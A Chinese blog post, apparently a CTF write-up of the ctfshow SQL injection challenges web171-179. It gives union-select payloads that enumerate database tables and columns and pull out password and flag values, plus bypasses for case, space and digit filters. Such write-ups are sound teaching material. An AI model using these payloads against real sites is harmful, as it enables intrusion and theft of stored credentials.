<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>ctfshow sql注入漏洞 171-179 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="ctfshow sql注入漏洞 171-179" />
<meta property="og:description" content="web171
题目已经给出了拼接的语句是带有单引号的所以我们要闭合并且利用-- 注释掉后面的单引号
1&#39; order by 3-- A 首先查询字段有多少，我试了2,3,4，到4的时候端口异常所以判断为三个字段
-1&#39; union select 1,2,3--&#43; 查看当前哪些数据可以回显
-1&#39; union select 1,2,database()--&#43; 查看当前的数据库
-1&#39; union select 1,2,table_name from information_schema.tables where table_schema=&#39;ctfshow_web&#39;--&#43; -1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;ctfshow_web&#39;--&#43; 查ctfshow_web的表
-1&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;ctfshow_user&#39;--&#43; -1&#39; union select 1,2,column_name from information_schema.columns where table_name=&#39;ctfshow_user&#39; --&#43; 查询列信息
-1&#39; union select 1,password,username from ctfshow_user where username=&#39;flag&#39; --&#43; 拿到flag
web172
1` order by 2 --&#43; 发现只有两个回显。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/d7dd3dec28e6618825510699ce50c4c2/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-10-21T20:33:36+08:00" />
<meta property="article:modified_time" content="2021-10-21T20:33:36+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">ctfshow sql注入漏洞 171-179</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p><strong>web171</strong><br> <img src="https://images2.imgbox.com/06/16/c9XGjHWc_o.png" alt=""></p> 
<p>题目已经给出了拼接的语句是带有单引号的所以我们要闭合并且利用-- 注释掉后面的单引号</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span><span class="token comment">-- A</span>
</code></pre> 
<p>首先查询字段有多少，我试了2,3,4，到4的时候端口异常所以判断为三个字段</p> 
<pre><code class="prism language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment">--+</span>
</code></pre> 
<p>查看当前哪些数据可以回显<br> <img src="https://images2.imgbox.com/ac/b6/YxuszZZf_o.png" alt=""></p> 
<pre><code class="prism language-sql"><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre> 
<p>查看当前的数据库<br> <img src="https://images2.imgbox.com/a7/f5/aLIU1bO8_o.png" alt=""></p> 
<pre><code class="prism language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,table_name from information_schema.tables where table_schema='</span>ctfshow_web<span class="token string">'--+
-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'ctfshow_web'</span><span class="token comment">--+</span>
</code></pre> 
<p>查ctfshow_web的表<br> <img src="https://images2.imgbox.com/45/ee/1XZWUlGH_o.png" alt=""></p> 
<pre><code class="prism language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,column_name from information_schema.columns where table_name='</span>ctfshow_user<span class="token string">'--+
-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'ctfshow_user'</span> <span class="token comment">--+</span>
</code></pre> 
<p>查询列信息<br> <img src="https://images2.imgbox.com/fd/fd/tyGQRlkV_o.png" alt=""></p> 
<pre><code class="prism language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,password,username from ctfshow_user where username='</span>flag' <span class="token comment">--+</span>
</code></pre> 
<p>拿到flag<br> <img src="https://images2.imgbox.com/28/83/8K8PpeoW_o.png" alt=""></p> 
<p><strong>web172</strong><br> <img src="https://images2.imgbox.com/d9/fb/CTXdDIGM_o.png" alt=""></p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token punctuation">`</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span> <span class="token comment">--+</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/76/f1/Mn9RtF7G_o.png" alt=""></p> 
<p>发现只有两个回显。</p> 
<pre><code class="prism language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,table_name from information_schema.tables where table_schema='</span>ctfshow_web' <span class="token comment">--+</span>
</code></pre> 
<p>发现有两个表<br> <img src="https://images2.imgbox.com/cc/54/SeXUQ3b4_o.png" alt=""></p> 
<pre><code class="prism language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,password from ctfshow_user  --+
-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_user2  <span class="token comment">--+</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/7d/ac/032fs0XZ_o.png" alt=""><br> 拿到flag。</p> 
<p><strong>web173</strong></p> 
<p>思路同上题</p> 
<p><img src="https://images2.imgbox.com/75/e4/oOPfZFFP_o.png" alt=""></p> 
<p><strong>web174</strong><br> <img src="https://images2.imgbox.com/34/fd/jfb7Pe1T_o.png" alt=""></p> 
<p>过滤了数字和flag</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">' union select '</span>q<span class="token string">',(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),'</span><span class="token number">1</span><span class="token string">','</span>q<span class="token string">'),'</span><span class="token number">2</span><span class="token string">','</span>w<span class="token string">'),'</span><span class="token number">3</span><span class="token string">','</span>e<span class="token string">'),'</span><span class="token number">4</span><span class="token string">','</span>r<span class="token string">'),'</span><span class="token number">5</span><span class="token string">','</span>t<span class="token string">'),'</span><span class="token number">6</span><span class="token string">','</span>y<span class="token string">'),'</span><span class="token number">7</span><span class="token string">','</span>u<span class="token string">'),'</span><span class="token number">8</span><span class="token string">','</span>i<span class="token string">'),'</span><span class="token number">9</span><span class="token string">','</span>o<span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>p<span class="token string">') from ctfshow_user4 where username='</span>flag'<span class="token punctuation">)</span><span class="token comment">--+</span>
</code></pre> 
<p>将数字1-0对应换成键盘上的q~p,flag中的g换成h(后来发现flag不是用flag{}包起来的，这个可以不用),我们将password首先hex一下，因为hex()函数的返回值中字母都是大写的，所以我们返回结果中的小写字母就是原来的数字，而大写字母就是原本的字符<br> <img src="https://images2.imgbox.com/b8/3e/yGm3rjjg_o.png" alt=""></p> 
<pre><code class="prism language-sql">用mysql执行输出flag
<span class="token keyword">select</span> <span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token keyword">replace</span><span class="token punctuation">(</span><span class="token string">'yeuryyueyiyFuuuBeqyreuewepyyyyeowDeryretewwDereqeqepwDyqyyyrytwDyeeuyrepyteyywetyqeoeoyquD'</span><span class="token punctuation">,</span><span class="token string">'q'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'y'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'u'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'i'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'p'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/95/eb/oDfTmDQN_o.png" alt=""></p> 
<p><img src="https://images2.imgbox.com/13/1d/QLBEpfTT_o.png" alt=""></p> 
<p><strong>web175</strong></p> 
<p><strong>web176</strong><br> 大小写过滤</p> 
<pre><code class="prism language-sql">
<span class="token number">1</span><span class="token string">' uNion Select 1,2,3--+
1'</span> <span class="token keyword">uNion</span> <span class="token keyword">Select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>password <span class="token keyword">from</span> ctfshow_user<span class="token comment">--+</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/f8/49/nbwLIIdd_o.png" alt=""></p> 
<p><strong>web177</strong><br> 过滤了空格</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">'/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/='</span>flag'<span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/d8/c8/jyNa5yAw_o.png" alt=""></p> 
<p><strong>web178</strong></p> 
<p>换了个方式绕过空格，%09对应的是tab键的url编码</p> 
<pre><code class="prism language-sql">
<span class="token number">1</span><span class="token string">'%09union%09select%091,2,3%23
1'</span><span class="token operator">%</span><span class="token number">09</span>union<span class="token operator">%</span><span class="token number">09</span>select<span class="token operator">%</span><span class="token number">091</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">%</span><span class="token number">09</span>password<span class="token operator">%</span><span class="token number">09</span>from<span class="token operator">%</span><span class="token number">09</span>ctfshow_user<span class="token operator">%</span><span class="token number">09</span>where<span class="token operator">%</span><span class="token number">09</span>username<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/6c/9e/IVdhHoeh_o.png" alt=""></p> 
<p><strong>web179</strong></p> 
<p>过滤了空格，ASCII一个个试，%0c可以用</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">'%0cunion%0cselect%0c1,2,3%23
1'</span><span class="token operator">%</span><span class="token number">0</span>cunion<span class="token operator">%</span><span class="token number">0</span>cselect<span class="token operator">%</span><span class="token number">0</span>c1<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token operator">%</span><span class="token number">0</span>cpassword<span class="token operator">%</span><span class="token number">0</span>cfrom<span class="token operator">%</span><span class="token number">0</span>cctfshow_user<span class="token operator">%</span><span class="token number">0</span>cwhere<span class="token operator">%</span><span class="token number">0</span>cusername<span class="token operator">=</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/a5/3e/Inf4JtRd_o.png" alt=""></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/28597740c033bb4c0cf8a9f386396d0c/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">openstack部署过程5</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/109d09f5f1657c93cc97089eff4b64b1/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">LLVM学习笔记③</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>